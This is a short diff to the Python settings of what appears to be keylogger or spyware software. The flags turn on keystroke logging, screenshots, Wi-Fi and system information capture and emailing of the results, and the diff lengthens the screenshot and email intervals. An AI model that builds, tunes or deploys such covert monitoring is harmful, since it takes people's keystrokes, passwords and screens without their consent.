@@ -32,9 +32,9 @@ system = platform.system()
 data = {    
     "info_email_receiver": "",
     "send_info": True,
-    "email_send_time": 40,
+    "email_send_time": 120,
     "take_screenshot": True,
-    "screenshot_time": 10,
+    "screenshot_time": 60,
     "key_logg": True,
     "get_wifi_info": True,
     "system_info": True,
